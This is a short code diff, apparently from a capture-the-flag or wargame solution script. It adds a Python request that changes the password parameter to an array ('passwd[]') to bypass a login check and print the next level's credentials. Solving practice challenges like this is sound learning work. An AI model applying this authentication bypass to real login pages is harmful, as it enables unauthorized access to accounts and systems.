@@ -53,3 +53,10 @@ source = bs4.BeautifulSoup(source, 'lxml')
 # and it should give the credentials to the next level
 # to do this, we can simply change the input type from text, i.e. "passwd", to 
 # "passwd[]"
+params = {
+    "passwd[]" : "",
+    "submit" : "Login"
+}
+response = session.get(URL, params=params)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
